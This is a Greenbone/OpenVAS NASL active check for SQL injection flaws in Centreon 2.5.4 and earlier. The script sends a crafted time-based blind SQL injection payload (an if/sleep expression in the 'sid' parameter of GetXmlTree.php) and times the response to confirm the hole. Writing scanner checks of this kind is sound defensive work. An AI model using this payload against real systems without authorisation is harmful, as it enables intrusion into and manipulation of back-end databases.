# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:centreon:centreon";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805974");
  script_version("2025-06-03T05:40:40+0000");
  script_cve_id("CVE-2015-1560", "CVE-2015-1561");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2025-06-03 05:40:40 +0000 (Tue, 03 Jun 2025)");
  script_tag(name:"creation_date", value:"2015-09-08 13:07:40 +0530 (Tue, 08 Sep 2015)");
  script_name("Centreon Multiple Vulnerabilities (Sep 2015) - Active Check");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_centreon_web_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("centreon_web/http/detected");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/37528");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/75602");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/75605");
  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/132607");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/archive/1/535961/100/0/threaded");

  script_tag(name:"summary", value:"Centreon is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The following flaws exist:

  - Input passed via GET parameter 'sid' is not validated before passing to the common-Func.php
  script.

  - Input passed via parameters 'ns_id' and 'end' is not validated before passing to the
  getStats.php script.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to inject or
  manipulate SQL queries in the back-end database, allowing for the manipulation or disclosure of
  arbitrary data.");

  script_tag(name:"affected", value:"Centreon version 2.5.4 and prior.");

  script_tag(name:"solution", value:"Update to the latest version.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

time_taken = 0;
wait_extra_sec = 5;

if (!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if (!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if (dir == "/")
  dir = "";

sleep = make_list(1, 2, 3);

foreach sec (sleep) {
  url = dir + "/include/common/XmlTree/GetXmlTree.php?sid=%27%2Bif(1%3C2,sleep(" + sec + "),%27%27)%2B%27";

  req = http_get(item:url, port:port);
  start = unixtime();
  http_keepalive_send_recv(port:port, data:req);

  stop = unixtime();
  time_taken = stop - start;

  ##Time taken is approx thrice
  sec = sec * 3 ;
  if (time_taken + 1 < sec || time_taken > (sec + wait_extra_sec))
    exit(0);
}

report = http_report_vuln_url(port:port, url:url);
security_message(port:port, data:report);
exit(0);
